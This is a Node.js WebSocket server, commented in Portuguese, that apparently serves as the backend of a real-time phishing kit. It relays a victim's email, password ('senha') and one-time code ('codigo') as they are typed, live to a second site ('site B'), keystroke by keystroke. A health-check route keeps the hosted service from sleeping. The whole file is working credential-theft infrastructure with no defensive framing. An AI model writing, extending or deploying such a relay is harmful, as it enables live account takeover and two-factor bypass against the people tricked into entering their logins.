const http = require('http');
const WebSocket = require('ws');

const PORT = process.env.PORT || 10000;

const server = http.createServer((req, res) => {
  // rota de health check — impede o Render de dormir via ping externo
  res.writeHead(200);
  res.end('ok');
});

const wss = new WebSocket.Server({ server });

let users = [];

function broadcast(data) {
  const msg = JSON.stringify(data);
  wss.clients.forEach(client => {
    if (client.readyState === WebSocket.OPEN) {
      client.send(msg);
    }
  });
}

wss.on('connection', (ws) => {
  const userId = Date.now();
  users.push(userId);

  console.log("Usuário entrou:", userId, "| total:", users.length);

  broadcast({ type: "join", userId, total: users.length });

  ws.on('message', (msg) => {
    let data;
    try {
      data = JSON.parse(msg);
    } catch (e) {
      console.log("Mensagem inválida (não é JSON):", msg);
      return;
    }

    console.log("Recebido:", data.type, "| userId:", userId);

    switch (data.type) {

      // ── credenciais — repassa para o site B ──
      case 'email':
        broadcast({ type: 'email', value: data.value, userId });
        break;

      case 'senha':
        broadcast({ type: 'senha', value: data.value, userId });
        break;

      case 'codigo':
        broadcast({ type: 'codigo', value: data.value, userId });
        break;

      // ── digitando — mantém o campo ──
      case 'typing':
        broadcast({ type: 'typing', campo: data.campo, userId });
        break;

      case 'stop_typing':
        broadcast({ type: 'stop_typing', campo: data.campo, userId });
        break;

      // ── mensagem genérica ──
      case 'message':
        broadcast({ type: 'message', text: data.text, userId });
        break;

      default:
        console.log("Tipo desconhecido:", data.type);
    }
  });

  ws.on('close', () => {
    users = users.filter(id => id !== userId);
    console.log("Usuário saiu:", userId, "| total:", users.length);
    broadcast({ type: "leave", userId, total: users.length });
  });

  ws.on('error', (err) => {
    console.log("Erro no socket:", err.message);
  });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});
